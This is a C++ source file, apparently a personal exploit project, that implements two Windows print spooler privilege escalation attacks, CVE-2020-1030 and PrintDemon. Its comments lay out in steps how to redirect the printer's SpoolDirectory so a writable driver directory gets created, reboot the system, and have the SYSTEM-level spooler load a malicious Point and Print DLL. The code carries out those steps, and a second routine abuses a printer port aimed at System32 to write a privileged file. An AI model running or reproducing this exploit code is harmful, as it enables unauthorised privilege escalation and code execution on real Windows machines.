
#include <string>
#include <iostream>
#include <fstream>
#include <Windows.h>

#include "printer.h"
#include "utils.h"

using std::cout;
using std::endl;
using std::string;

/*
	CVE-2020-1030:
	- use point-and-print driver distribution technology to load a dll
	- to load a custom point and print dll we have to define the CopyFiles registry key within the printer's configuration
	- printer configurations are stored in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Print\Printers

	the spooler searched for the PointAndPrint DLL in:
	1. %SYSTEMROOT%\System32
	2. %SYSTEMROOT%\System32\spool\drivers\<ENVIRONMENT>\<DRIVERVERSION>

	so, if i set the CopyFiles\Payload to malicious.dll, then the spooler will try to load:
	1. C:\\Windows\System32\malicious.dll
	2. C:\\Windows\System32\spool\drivers\x64\4\malicious.dll

	but: for introduce the dll in 1. we need admin priviledges,
	and for 2. usually the version 4 driver directory is absent on Windows systems -> we need admin priviledges to create the directory "4"

	so our goal: being able to interact with the spooler in order to create the dir C:\\Windows\System32\spool\drivers\x64\4\ with
	write permissions for all users, then wrtie the malicious.dll inside it and load it inside the spooler setting the PointAndPrint DLL

	to do it:
	1. set the SpoolDirectory of the printer to C:\\Windows\System32\spool\drivers\x64\4
	2. there is NO CHECK regarding the permission of the user to create that directory
	3. once the spooling service is restarted, the directory is created. Being a SpoolDirectory is set to be writeable by all users (only if it is created, if it already exits, then its permissions are not changed)
	4. so we need to force the spooling service to restart (by setting the C:\Windows\System32\AppVTerminator.dll as PointAndPrint DLL)
	5. once the service is restarted, and the C:\\Windows\System32\spool\drivers\x64\4 directory created, we can copy the malicious.dll inside that directory
	6. setting C:\\Windows\System32\spool\drivers\x64\4\malicious.dll as PointAndPrint DLL, it will be loaded: DONE!

	malicious.dll, imitating as a Point and Print DLL, must export the SpoolerCopyFileEvent function.
	This function is called once the module is loaded into the process.
*/
void cve_2020_1030(int argc, wchar_t* argv[]) {

	wchar_t* printerName = const_cast<wchar_t*>(L"cve-2020-1030"), 
		* v4DriverDir = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4"); 

	HANDLE hPrinter = OpenPrinter(printerName); // todo: check on handler 
	DWORD cbData, dwStatus; 

	BOOL hasBeenRestarted = isAppStartedFromReboot(argc, argv); 
	if (hasBeenRestarted) {
		 Sleep(1000 * 60); 

		// check if v4 driver directory has been correctly created 
		if (!doesDirExists(v4DriverDir)) {
			cout << "[-] v4 directory not created" << endl; 
			return; 
		}
		cout << "[+] v4 directory successfully created" << endl; 

		// move cve_2020_1030.dll inside that directory 
		wchar_t* oldDLLPath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\PointAndPrint.dll"),
			* newDLLPath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4\\cve_2020_1030.dll"),
			*dllName = const_cast<wchar_t*>(L"cve_2020_1030.dll");

		if (!MoveFile(oldDLLPath, newDLLPath)) {
			cout << "[-] Error while copying the DLL inside v4 directory" << endl;
			return;
		}
		cout << "[+] DLL correctly copied inside v4 directory" << endl;

		// set the cve_2020_1030.dll as PointAndPrint DLL 	
		cbData = ((DWORD)wcslen(dllName) + 1) * sizeof(WCHAR);
		dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)dllName, cbData);

		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting the PointAndPrint DLL" << dwStatus << endl;
			return;
		}
		cout << "[+] PointAndPrint DLL correctly set" << endl;

	} else {
		cbData = ((DWORD)wcslen(v4DriverDir) + 1) * sizeof(WCHAR); // size of the value 
		dwStatus = SetPrinterDataEx(hPrinter, L"\\", L"SpoolDirectory", REG_SZ, (LPBYTE)v4DriverDir, cbData);

		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting SpoolDirectory to v4: " << dwStatus << endl; 
			return; 
		} 
		cout << "[+] SpoolDirectory correctly set to v4" << endl; 

		// restart the spooling service (and the system) to create the SpoolDirectory
		BOOL result = registerApplicationAndRestartSystem(); 
	}

	ClosePrinter(hPrinter);
}

/*
	1. driver Generic / Text Only 
	2. port pointing to a privileged location of the file system 
	3. create printer with the previous driver and port 
	4. start printing inside the port 
	5. pause the printing job 
	6. reboot & see 
*/
void print_demon(int argc, wchar_t* argv[]) {
	BOOL hasBeenRestarted = isAppStartedFromReboot(argc, argv);
	wchar_t* printerName = const_cast<wchar_t*>(L"PrintDemon Printer");

	if (!hasBeenRestarted) {
		wchar_t* driverName = const_cast<wchar_t*>(L"Generic / Text Only");
		wchar_t* portName = const_cast<wchar_t*>(L"C:\\Windows\\System32\\Port.txt");

		// install driver and create port 
		HRESULT driverResult = AddDriver(driverName);
		DWORD portResult = AddPort(portName);

		// create printer 
		HANDLE hPrinter = AddPrinter(printerName, driverName, portName);
		ClosePrinter(hPrinter);

		// get the handle to the printer 
		hPrinter = OpenPrinter(printerName);

		// start the printing job 
		std::string text = "Something to print"; 
		DOC_INFO_1 docInfo;
		docInfo.pDatatype = const_cast<wchar_t*>(L"RAW");
		docInfo.pOutputFile = NULL;
		docInfo.pDocName = const_cast<wchar_t*>(L"Document");
		DWORD jobID = StartDocPrinter(hPrinter, 1, (LPBYTE)&docInfo);
		
		if (jobID == 0) {
			cout << "[-] Impossible to start the printing job" << endl; 
			return; 
		}
		cout << "[+] Printing job correctly started, with ID: " << jobID << endl; 

		DWORD dwNeeded = (DWORD)strlen(text.c_str());
		char* pText = const_cast<char*>(text.c_str());
		if (!WritePrinter(hPrinter, pText, dwNeeded, &dwNeeded)) {
			cout << "[-] Error while requesting to print inside the job" << endl; 
			return; 
		}
		cout << "[+] Correctly started to print" << endl; 
		EndDocPrinter(hPrinter); 

		if (!SetJob(hPrinter, jobID, 0, NULL, JOB_CONTROL_PAUSE)) {
			cout << "[-] Error while pausing the printing job, error: " << GetLastError() << endl;
			return; 
		}
		cout << "[+] Correctly paused the job" << endl; 
		
		registerApplicationAndRestartSystem(); 
		// return EndDocPrinter(hPrinter);
	}
	else {
		// unpause the printing job
		HANDLE hPrinter = OpenPrinter(printerName); 
		JOB_INFO_1* pJobInfo = NULL; 
		DWORD dwNeeded, dwReturned;

		//Get amount of memory needed
		if (!EnumJobs(hPrinter, 0, 1, 1, NULL, 0, &dwNeeded, &dwReturned)) {
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
				cout << "[-] Error while obtaining memory necessary to enumerate printing jobs, error: " << GetLastError() << endl;
				return;
			}
		}
		cout << "[+] Successfully obtained memory necessary, " << dwNeeded << "\t" << dwReturned << endl; 

		//Allocate the memory
		pJobInfo = (JOB_INFO_1*)malloc(dwNeeded);
		if (!EnumJobs(hPrinter, 0, 1, 1, (LPBYTE)pJobInfo, dwNeeded, &dwNeeded, &dwReturned)) {
			cout << "[-] Error while obtaining first element of the queue, error: " << GetLastError() << endl; 
			return; 
		}
		if (pJobInfo == NULL) {
			cout << "[-] Job Info pointer is still NULL" << endl;
			return;
		}
		cout << "[+] Successfully obtained first element of the queue, id: " << pJobInfo[0].JobId << endl; 
		
		if (SetJob(hPrinter, pJobInfo[0].JobId, 0, NULL, JOB_CONTROL_RESUME)) {
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
				cout << "[-] Error while resuming the print job, error: " << GetLastError() << endl;
				return;
			}
		}

		cout << "[+] Restarted printing job" << endl;
	}
}

int main(int argc, wchar_t* argv[]) {
		
	/*wchar_t* driverName = const_cast<wchar_t*>(L"Microsoft Print To PDF");
	wchar_t* portName = const_cast<wchar_t*>(L"PORTPROMPT:");
	wchar_t* printerName = const_cast<wchar_t*>(L"PrinterExample");

	// install driver and create port 
	HRESULT driverResult = AddDriver(driverName);
	DWORD portResult = AddPort(portName);

	// create printer 
	HANDLE hPrinter = AddPrinter(printerName, driverName, portName);
	ClosePrinter(hPrinter);*/

	// execute printdemon exploit
	print_demon(argc, argv); 

	system("pause");
	return 0;
}


/*
// int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

	wchar_t* printerName = const_cast<wchar_t*>(L"cve-2020-1030");
	

	HANDLE hPrinter = OpenPrinter(printerName);

	wchar_t *dllName = const_cast<wchar_t*>(L"example.dll");

	DWORD cbData, dwStatus;
	cbData = ((DWORD)wcslen(dllName) + 1) * sizeof(WCHAR);
	dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)dllName, cbData);


	// cve_2020_1030(argc, argv);
	ClosePrinter(hPrinter);
*/